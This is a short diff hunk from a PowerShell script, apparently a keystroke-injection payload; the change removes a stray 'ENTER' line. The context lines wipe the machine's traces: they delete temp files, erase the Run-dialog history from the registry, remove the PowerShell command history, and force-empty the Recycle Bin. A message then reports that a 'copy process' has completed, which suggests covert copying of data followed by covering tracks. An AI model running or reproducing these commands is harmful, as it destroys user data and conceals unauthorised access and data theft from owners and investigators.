@@ -40,7 +40,6 @@ Remove-Item "$env:TEMP\*" -Recurse -Force -ErrorAction SilentlyContinue
 reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /va /f
 Remove-Item (Get-PSReadLineOption).HistorySavePath -ErrorAction SilentlyContinue
 Clear-RecycleBin -Force -ErrorAction SilentlyContinue
-ENTER
 
 Write-Host "[+] Copy process completed!" -ForegroundColor Green
 Start-Sleep -Seconds 3
